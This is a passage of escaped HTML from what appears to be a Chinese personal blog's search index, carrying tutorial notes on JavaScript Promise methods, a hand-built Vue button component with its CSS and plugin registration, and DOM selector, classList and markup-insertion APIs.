&lt;p&gt;&lt;code&gt;Promise.race()&lt;/code&gt;方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const p = Promise.race([p1, p2, p3]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要&lt;code&gt;p1&lt;/code&gt;、&lt;code&gt;p2&lt;/code&gt;、&lt;code&gt;p3&lt;/code&gt;之中有一个实例率先改变状态，&lt;code&gt;p&lt;/code&gt;的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给&lt;code&gt;p&lt;/code&gt;的回调函数，不管是最先返回的是什么状态。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseallsettled&#34;&gt;&lt;code&gt;Promise.allSettled()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Promise.allSettled()&lt;/code&gt;方法用来确定一组异步操作是否都结束了（不管成功或失败）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise.allSettled()&lt;/code&gt;方法接受一个数组作为参数，数组的每个成员都是一个 Promise 对象，并返回一个新的 Promise 对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const promises = [
  fetch(&#39;/api-1&#39;),
  fetch(&#39;/api-2&#39;),
  fetch(&#39;/api-3&#39;),
];

await Promise.allSettled(promises);
removeLoadingIndicator();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;数组&lt;code&gt;promises&lt;/code&gt;包含了三个请求，只有等到这三个请求都结束了（不管请求成功还是失败），&lt;code&gt;removeLoadingIndicator()&lt;/code&gt;才会执行。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseany&#34;&gt;&lt;code&gt;Promise.any()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;该方法接受一组 Promise 实例作为参数，包装成一个新的 Promise 实例返回。&lt;/p&gt;
&lt;p&gt;只要参数实例有一个变成&lt;code&gt;fulfilled&lt;/code&gt;状态，包装实例就会变成&lt;code&gt;fulfilled&lt;/code&gt;状态&lt;/p&gt;
&lt;p&gt;如果所有参数实例都变成&lt;code&gt;rejected&lt;/code&gt;状态，包装实例就会变成&lt;code&gt;rejected&lt;/code&gt;状态&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const promises = [
  fetch(&#39;/endpoint-a&#39;).then(() =&amp;gt; &#39;a&#39;),
  fetch(&#39;/endpoint-b&#39;).then(() =&amp;gt; &#39;b&#39;),
  fetch(&#39;/endpoint-c&#39;).then(() =&amp;gt; &#39;c&#39;),
];

try {
  const first = await Promise.any(promises);
  console.log(first);
} catch (error) {
  console.log(error);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Promise.any()&lt;/code&gt;抛出的错误，不是一个一般的 Error 错误对象，而是一个 AggregateError 实例。它相当于一个数组，每个成员对应一个被&lt;code&gt;rejected&lt;/code&gt;的操作所抛出的错误。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseresolve&#34;&gt;&lt;code&gt;Promise.resolve()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;有时需要将现有对象转为 Promise 对象，&lt;code&gt;Promise.resolve()&lt;/code&gt;方法就起到这个作用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const jsPromise = Promise.resolve($.ajax(&#39;/whatever.json&#39;));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Promise.resolve()&lt;/code&gt;方法的参数分成四种情况。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）参数是一个 Promise 实例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果参数是 Promise 实例，那么&lt;code&gt;Promise.resolve&lt;/code&gt;将不做任何修改、原封不动地返回这个实例。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;（2）参数是一个&lt;code&gt;thenable&lt;/code&gt;对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;thenable&lt;/code&gt;对象指的是具有&lt;code&gt;then&lt;/code&gt;方法的对象，比如下面这个对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let thenable = {
  then: function(resolve, reject) {
    resolve(42);
  }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Promise.resolve()&lt;/code&gt;方法会将这个对象转为 Promise 对象，然后就立即执行&lt;code&gt;thenable&lt;/code&gt;对象的&lt;code&gt;then()&lt;/code&gt;方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let thenable = {
  then: function(resolve, reject) {
    resolve(42);
  }
};

let p1 = Promise.resolve(thenable);
p1.then(function (value) {
  console.log(value);  // 42
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;thenable&lt;/code&gt;对象的&lt;code&gt;then()&lt;/code&gt;方法执行后，对象&lt;code&gt;p1&lt;/code&gt;的状态就变为&lt;code&gt;resolved&lt;/code&gt;，从而立即执行最后那个&lt;code&gt;then()&lt;/code&gt;方法指定的回调函数&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;（3）参数不是具有&lt;code&gt;then()&lt;/code&gt;方法的对象，或根本就不是对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果参数是一个原始值，或者是一个不具有&lt;code&gt;then()&lt;/code&gt;方法的对象，则&lt;code&gt;Promise.resolve()&lt;/code&gt;方法返回一个新的 Promise 对象，状态为&lt;code&gt;resolved&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const p = Promise.resolve(&#39;Hello&#39;);

p.then(function (s) {
  console.log(s)
});
// Hello
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;（4）不带有任何参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise.resolve()&lt;/code&gt;方法允许调用时不带参数，直接返回一个&lt;code&gt;resolved&lt;/code&gt;状态的 Promise 对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const p = Promise.resolve();

p.then(function () {
  // ...
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promisereject&#34;&gt;&lt;code&gt;Promise.reject()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Promise.reject(reason)&lt;/code&gt;方法也会返回一个新的 Promise 实例，该实例的状态为`rejected&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise.reject()&lt;/code&gt;方法的参数，会原封不动地作为&lt;code&gt;reject&lt;/code&gt;的理由，变成后续方法的参数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Promise.reject(&#39;出错了&#39;)
.catch(e =&amp;gt; {
  console.log(e === &#39;出错了&#39;)
})
// true
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promisetry&#34;&gt;&lt;code&gt;Promise.try()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;那么有没有一种方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？&lt;/p&gt;
&lt;p&gt;第一种写法是用&lt;code&gt;async&lt;/code&gt;函数来写。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const f = () =&amp;gt; console.log(&#39;now&#39;);
(async () =&amp;gt; f())();
console.log(&#39;next&#39;);
// now
// next
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二种写法是使用&lt;code&gt;new Promise()&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const f = () =&amp;gt; console.log(&#39;now&#39;);
(
  () =&amp;gt; new Promise(
    resolve =&amp;gt; resolve(f())
  )
)();
console.log(&#39;next&#39;);
// now
// next
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Promise.try&lt;/code&gt;方法替代上面的写法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const f = () =&amp;gt; console.log(&#39;now&#39;);
Promise.try(f);
console.log(&#39;next&#39;);
// now
// next
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;应用&#34;&gt;应用&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;加载图片&#34;&gt;加载图片&lt;/h3&gt;
&lt;p&gt;我们可以将图片的加载写成一个&lt;code&gt;Promise&lt;/code&gt;，一旦加载完成，&lt;code&gt;Promise&lt;/code&gt;的状态就发生变化。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const preloadImage = function (path) {
  return new Promise(function (resolve, reject) {
    const image = new Image();
    image.onload  = resolve;
    image.onerror = reject;
    image.src = path;
  });
};
&lt;/code&gt;&lt;/pre&gt;
">Promise 对象</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-kai-fa-ui-zu-jian-ri-zhi/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/wsk1576025821/p/10912807.html&#34;&gt;参考源码&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;button组件&#34;&gt;button组件&lt;/h2&gt;
&lt;p&gt;看部分源码仿照饿了吗组件开发&lt;/p&gt;
&lt;h3 id=&#34;伪类顺序&#34;&gt;伪类顺序&lt;/h3&gt;
&lt;p&gt;伪类的顺序会决定你写的伪类样式会不会生效&lt;/p&gt;
&lt;p&gt;&lt;code&gt;:link,:visited,:hover,:active&lt;/code&gt; 以这个顺序排列先后&lt;/p&gt;
&lt;p&gt;写伪类不要打空格隔开&lt;/p&gt;
&lt;p&gt;正确&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.fan-button-success:hover&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;错误&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.fan-button-success :hover&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;会产生奇怪的效果&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;icon图标插入注意点&#34;&gt;icon图标插入注意点&lt;/h3&gt;
&lt;p&gt;当插入icon的时候，如果希望和span里面的字有margin&lt;/p&gt;
&lt;p&gt;可以按如下写法匹配按钮下面的span标签&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.fan-button [class*=el-icon-]+span {
    margin-left: 5px;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;实现效果&#34;&gt;实现效果&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628605347878.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;核心代码&#34;&gt;核心代码&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Btnindex.vue&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
      &amp;lt;button 
       class=&amp;quot;fan-button&amp;quot;
      :type=&amp;quot;nativetype&amp;quot; 
      @click=&amp;quot;handleClick&amp;quot;
      :disabled=&amp;quot;isdisabled||loading&amp;quot;
      :class=&amp;quot;[
      type?&#39;fan-button-&#39;+type:&#39;&#39;,
      btnsize?&#39;fan-button-&#39;+btnsize:&#39;&#39;,
      {
        &#39;is-circle&#39;: circle,
        &#39;is-round&#39;:round,
        &#39;is-disabled&#39;:disabled,
        &#39;is-plain&#39;:plain,
      }]&amp;quot;
      &amp;gt;

      &amp;lt;i class=&amp;quot;el-icon-loading&amp;quot; v-if=&amp;quot;loading&amp;quot;&amp;gt;&amp;lt;/i&amp;gt;
      &amp;lt;i :class=&amp;quot;icon&amp;quot; v-if=&amp;quot;icon &amp;amp;&amp;amp; !loading&amp;quot; &amp;gt;&amp;lt;/i&amp;gt;
          &amp;lt;span v-if=&amp;quot;$slots.default&amp;quot;&amp;gt;
              &amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;    
            &amp;lt;/span&amp;gt; 
    &amp;lt;/button&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
    name:&#39;FanBtn&#39;,
     props:{
        type:{
            type:String,
            default:&amp;quot;default&amp;quot;
        },
        nativetype:{
             type:String,
             default:&amp;quot;button&amp;quot;
        },       
        icon:{
            type:String,
            default:&#39;&#39;
        },
        size:String,
        disabled:Boolean,
         circle:Boolean,
        loading: Boolean,
        round:Boolean,
        plain:Boolean
    },
   
    data() {
        return {
            
        }
    },
    computed:{
        //返回是否禁用
        isdisabled(){
            return this.disabled
        },
        //计算属性
        btnsize()
        {
            return this.size
        }
      
    },
    methods:{
        handleClick(e)
        {
            //与@的名字相对应
            this.$emit(&#39;click&#39;,e)
        },
        
    }
}
&amp;lt;/script&amp;gt;

&amp;lt;style &amp;gt;

/**基础样式写最前面 */
.fan-button{
    display: inline-block;
    line-height: 1;
    white-space: nowrap;
    cursor: pointer;
    background: #fff;
    border: 1px solid #dcdfe6;
    color: #606266;
    -webkit-appearance: none;
    text-align: center;
    box-sizing: border-box;
    outline: none;
    margin: 0;
    transition: .1s;
    font-weight: 500;
    -moz-user-select: none;
    -webkit-user-select: none;
    -ms-user-select: none;
    padding: 12px 20px;
    font-size: 14px;
    border-radius: 4px; 
}
.fan-button:hover{
    color: #409eff;
    border-color: #c6e2ff;
    background-color: #ecf5ff;
}
.fan-button:active{
        color: #3a8ee6;
    border-color: #3a8ee6;
    outline: none;
}
.fan-button.is-disabled{
    color: #c0c4cc;
    cursor: not-allowed;
    background-image: none;
    background-color: #fff;
    border-color: #ebeef5;
}

    
.fan-button [class*=el-icon-]+span {
    margin-left: 5px;
}
/**dafault类型 */
.fan-button-default{
     background-color: #fff;;
}

/**primary 类型 */
.fan-button-primary{
    color:  #fff;
    background-color:#409eff;
    border-color: #409eff;
}
.fan-button-primary:hover{
    color:  #fff;
    background: #66b1ff;
    border-color: #66b1ff;
}
.fan-button-primary:active{
    color:  #fff;
    background-color: #3a8ee6;
    border-color: #3a8ee6;
    
}
/**每一种type对应一种禁止颜色 */
.fan-button-primary.is-disabled{
    color: #fff;
    background-color: #a0cfff;
    border-color: #a0cfff;
}
.fan-button-primary.is-plain{
    color: #409eff;
    background: #ecf5ff;
    border-color: #b3d8ff;
}


/**success类型 */
.fan-button-success{
    color: #fff;
    background-color: #67c23a;
    border-color: #67c23a;
}
.fan-button-success:hover{
    color:  #fff;
     background-color: #85ce61;
    border-color: #85ce61;
}
.fan-button-success:active{
    color:  #fff;
    background-color: #5daf34;
    border-color: #5daf34;
    
}
.fan-button-success.is-disabled{
        color: #fff;
    background-color: #b3e19d;
    border-color: #b3e19d;
}
.fan-button-success.is-plain{
        color: #67c23a;
    background: #f0f9eb;
    border-color: #c2e7b0;
}

/**danger类型 */
.fan-button-danger{
    color:  #fff;
    background-color:#f56c6c;
    border: 1px solid #f56c6c;
}
.fan-button-danger:hover{
    color:  #fff;
    background: #f78989;
    border-color: #f78989;
}
.fan-button-danger:active{
    color:  #fff;
    background: #dd6161;
    border-color: #dd6161;
}
.fan-button-danger.is-disabled{
    color: #fff;
    background-color: #fab6b6;
    border-color: #fab6b6;
}
.fan-button-danger.is-plain{
          color: #f56c6c;
    background: #fef0f0;
    border-color: #fbc4c4;
}

/**info样式 */
.fan-button-info{
        color: #fff;
    background-color: #909399;
    border-color: #909399
}
.fan-button-info:hover{
       background: #a6a9ad;
    border-color: #a6a9ad;
    color: #fff;
}
.fan-button-info:active{
        background: #82848a;
    border-color: #82848a;
    color: #fff;
}
.fan-button-info.is-disabled{
  color: #fff;
    background-color: #c8c9cc;
    border-color: #c8c9cc;
}
.fan-button-info.is-plain{
         color: #909399;
    background: #f4f4f5;
    border-color: #d3d4d6;
}


/**warning样式 */
.fan-button-warning{
    color: #fff;
    background-color: #e6a23c;
    border-color: #e6a23c;
}
.fan-button-warning:hover{
     background: #ebb563;
    border-color: #ebb563;
    color: #fff;
}
.fan-button-warning:active{
     background: #cf9236;
    border-color: #cf9236;
    color: #fff;
}
.fan-button-warning.is-disabled{
    color: #fff;
    background-color: #f3d19e;
    border-color: #f3d19e;
}
.fan-button-warning.is-plain{
          color: #e6a23c;
    background: #fdf6ec;
    border-color: #f5dab1;
}

/**小圆角样式 */
.is-round{
    border-radius:20px ;
}
/**圆圈样式 */
.is-circle{
      border-radius: 50%;
    padding: 12px;
}
/**被禁用 */
.is-disabled:hover{  
    cursor:not-allowed;
}

/**size样式 */
.fan-button-meidum{
    padding: 10px 20px;
    font-size: 14px;
    border-radius: 4px;
}
.fan-button-small{
        padding: 9px 15px;
    font-size: 12px;
    border-radius: 3px;
}
.fan-button-mini{
    padding: 7px 15px;
    font-size: 12px;
    border-radius: 3px;
}
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;导出部分&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import fanbtn from &#39;./button/index.vue&#39;


// 组件列表
const allcomponents=[
    fanbtn
]


const install=function(Vue){
     // 遍历并注册所有组件
     allcomponents.map(component =&amp;gt;{
        Vue.component(component.name, component);
     })

}

// 检测是否为vue环境
if (typeof window !== &#39;undefined&#39; &amp;amp;&amp;amp; window.Vue) {
    install(window.Vue)
}

export default {
    install
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;main.js&lt;/code&gt;中引入并且注册该方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//引入手写组件
import fanui from &#39;./components/fanfanui&#39;

Vue.use(fanui)
&lt;/code&gt;&lt;/pre&gt;
">VUE开发UI组件日志</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/dom-tuo-zhan/"" data-c="
          &lt;h2 id=&#34;选择符api&#34;&gt;选择符API&lt;/h2&gt;
&lt;h3 id=&#34;queryselector&#34;&gt;&lt;code&gt;querySelector()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;querySelector()&lt;/code&gt;方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹 配的元素，返回 null。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得 body 元素
var body = document.querySelector(&amp;quot;body&amp;quot;); 

//取得 ID 为&amp;quot;myDiv&amp;quot;的元素
var myDiv = document.querySelector(&amp;quot;#myDiv&amp;quot;); 

//取得类为&amp;quot;selected&amp;quot;的第一个元素
var selected = document.querySelector(&amp;quot;.selected&amp;quot;); 

//取得类为&amp;quot;button&amp;quot;的第一个图像元素
var img = document.body.querySelector(&amp;quot;img.button&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;queryselectorall&#34;&gt;&lt;code&gt;querySelectorAll()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;这个方法返回的是一个 NodeList 的实例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得某&amp;lt;div&amp;gt;中的所有&amp;lt;em&amp;gt;元素（类似于 getElementsByTagName(&amp;quot;em&amp;quot;)）
var ems = document.getElementById(&amp;quot;myDiv&amp;quot;).querySelectorAll(&amp;quot;em&amp;quot;); 

//取得class为&amp;quot;selected&amp;quot;的所有元素
var selecteds = document.querySelectorAll(&amp;quot;.selected&amp;quot;); 

//取得所有&amp;lt;p&amp;gt;元素中的所有&amp;lt;strong&amp;gt;元素
var strongs = document.querySelectorAll(&amp;quot;p strong&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;matchesselector&#34;&gt;&lt;code&gt;matchesSelector()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;为 Element 类型新增的一个方法&lt;/p&gt;
&lt;p&gt;这个方法接收 一个参数，即 CSS 选择符&lt;/p&gt;
&lt;p&gt;如果调用元素与该选择符匹配，返回 true；否则，返回 false&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if (document.body.matchesSelector(&amp;quot;body.page1&amp;quot;)){ 
 //true 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;元素遍历&#34;&gt;元素遍历&lt;/h2&gt;
&lt;p&gt;Element Traversal API 为 DOM 元素添加了以下 5 个属性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;childElementCount：返回子元素（不包括文本节点和注释）的个数。&lt;/li&gt;
&lt;li&gt;firstElementChild：指向第一个子元素；firstChild 的元素版。&lt;/li&gt;
&lt;li&gt;lastElementChild：指向最后一个子元素；lastChild 的元素版。&lt;/li&gt;
&lt;li&gt;previousElementSibling：指向前一个同辈元素；previousSibling 的元素版。&lt;/li&gt;
&lt;li&gt;nextElementSibling：指向后一个同辈元素；nextSibling 的元素版。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;html5&#34;&gt;HTML5&lt;/h2&gt;
&lt;h3 id=&#34;与类相关的扩充&#34;&gt;与类相关的扩充&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;getElementsByClassName()&lt;/code&gt;接收一个参数：&lt;strong&gt;即一个包含一或多个类名的字符串&lt;/strong&gt;，返回带有 指定类的所有元素的 NodeList。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得所有类中包含&amp;quot;username&amp;quot;和&amp;quot;current&amp;quot;的元素，类名的先后顺序无所谓
var allCurrentUsernames = document.getElementsByClassName(&amp;quot;username current&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;classlist-属性&#34;&gt;classList 属性&lt;/h3&gt;
&lt;p&gt;定义如下方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;add(value)：将给定的字符串值添加到列表中。如果值已经存在，就不添加了。&lt;/li&gt;
&lt;li&gt;contains(value)：表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。&lt;/li&gt;
&lt;li&gt;remove(value)：从列表中删除给定的字符串。&lt;/li&gt;
&lt;li&gt;toggle(value)：如果列表中已经存在给定的值，删除它；如果列表中没有给定的值，添加它。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//删除&amp;quot;disabled&amp;quot;类
div.classList.remove(&amp;quot;disabled&amp;quot;); 

//添加&amp;quot;current&amp;quot;类
div.classList.add(&amp;quot;current&amp;quot;); 

//切换&amp;quot;user&amp;quot;类
div.classList.toggle(&amp;quot;user&amp;quot;);

//确定元素中是否包含既定的类名
if (div.classList.contains(&amp;quot;bd&amp;quot;) &amp;amp;&amp;amp; !div.classList.contains(&amp;quot;disabled&amp;quot;)){ 
 //执行操作
) 

//迭代类名
for (var i=0, len=div.classList.length; i &amp;lt; len; i++){ 
 doSomething(div.classList[i]); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;焦点管理&#34;&gt;焦点管理&lt;/h3&gt;
&lt;p&gt;HTML5 也添加了辅助管理 DOM 焦点的功能。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;document.activeElement&lt;/code&gt;	这个属性始终会引用 DOM 中当前获得了焦点的元素。&lt;/p&gt;
&lt;p&gt;元素获得焦点的方式有页面加载、用户输入（通常是 通过按 Tab 键）和在代码中调用 focus()方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var button = document.getElementById(&amp;quot;myButton&amp;quot;); 
button.focus(); 
alert(document.activeElement === button); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;document.hasFocus()&lt;/code&gt;用于确定文档是否获得了焦点。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;htmldocument的变化&#34;&gt;HTMLDocument的变化&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;readyState&lt;/code&gt; 通过它来实现一个指示文档已经加载完成的指示器&lt;/p&gt;
&lt;p&gt;Document 的 readyState 属性有两个可能的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;loading，正在加载文档；&lt;/li&gt;
&lt;li&gt;complete，已经加载完文档&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//如果加载完成了 类似onload
if (document.readyState == &amp;quot;complete&amp;quot;){ 
 //执行操作
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;自定义数据属性&#34;&gt;自定义数据属性&lt;/h3&gt;
&lt;p&gt;HTML5 规定可以为元素添加非标准的属性，但要添加前缀 data-，目的是为元素提供与渲染无关的 信息，或者提供语义信息。&lt;/p&gt;
&lt;p&gt;可以通过元素的 &lt;code&gt;dataset&lt;/code&gt;属性来访问自定义属性的值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得自定义属性的值
var appId = div.dataset.appId; 
var myName = div.dataset.myname;

//设置自定义值
div.dataset.appId = 23456; 
div.dataset.myname = &amp;quot;Michael&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;插入标记&#34;&gt;插入标记&lt;/h3&gt;
&lt;h4 id=&#34;innerhtml&#34;&gt;&lt;strong&gt;&lt;code&gt;innerHTML&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;在读模式下，innerHTML 属性返回与调用元素的所有子节点（包括元素、注释和文本节点）对应 的 HTML 标记。&lt;/p&gt;
&lt;p&gt;在写模式下，innerHTML 会根据指定的值&lt;strong&gt;创建新的 DOM 树&lt;/strong&gt;，然后用这个 DOM 树完全 &lt;strong&gt;替换调用元素原先的所有子节点&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;outerhtml&#34;&gt;&lt;code&gt;outerHTML&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;在读模式下，outerHTML 返回调用&lt;strong&gt;它的元素&lt;/strong&gt;及所有子节点的 HTML 标签。&lt;/p&gt;
&lt;p&gt;在写模式下，outerHTML 会根据指定的 HTML 字符串创建新的 DOM 子树，然后用这个 DOM 子树完全&lt;strong&gt;替换调用元素&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;insertadjacenthtml&#34;&gt;&lt;code&gt;insertAdjacentHTML()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;它接收两个参数：&lt;strong&gt;插入位置&lt;/strong&gt;和要&lt;strong&gt;插入的 HTML 文本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一个参数必须是下列值之一：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;quot;beforebegin&amp;quot;，在当前元素之前插入一个紧邻的同辈元素；&lt;/li&gt;
&lt;li&gt;&amp;quot;afterbegin&amp;quot;，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素；&lt;/li&gt;
&lt;li&gt;&amp;quot;beforeend&amp;quot;，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素；&lt;/li&gt;
&lt;li&gt;&amp;quot;afterend&amp;quot;，在当前元素之后插入一个紧邻的同辈元素。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//作为前一个同辈元素插入
element.insertAdjacentHTML(&amp;quot;beforebegin&amp;quot;, &amp;quot;&amp;lt;p&amp;gt;Hello world!&amp;lt;/p&amp;gt;&amp;quot;); 

//作为第一个子元素插入
element.insertAdjacentHTML(&amp;quot;afterbegin&amp;quot;, &amp;quot;&amp;lt;p&amp;gt;Hello world!&amp;lt;/p&amp;gt;&amp;quot;); 

//作为最后一个子元素插入
element.insertAdjacentHTML(&amp;quot;beforeend&amp;quot;, &amp;quot;&amp;lt;p&amp;gt;Hello world!&amp;lt;/p&amp;gt;&amp;quot;); 

//作为后一个同辈元素插入
element.insertAdjacentHTML(&amp;quot;afterend&amp;quot;, &amp;quot;&amp;lt;p&amp;gt;Hello world!&amp;lt;/p&amp;gt;&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;scrollintoview&#34;&gt;&lt;code&gt;scrollIntoView()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中&lt;/p&gt;
&lt;p&gt;如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。&lt;/p&gt;
&lt;p&gt;如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//让元素可见
document.forms[0].scrollIntoView();
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;拓展&#34;&gt;拓展&lt;/h2&gt;
&lt;h3 id=&#34;children属性&#34;&gt;children属性&lt;/h3&gt;
&lt;p&gt;children 属性与 childNodes 没有什么区别，即在元素只包含元素子节点时，这两个属性的值相同。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var childCount = element.children.length; 
var firstChild = element.children[0]; 
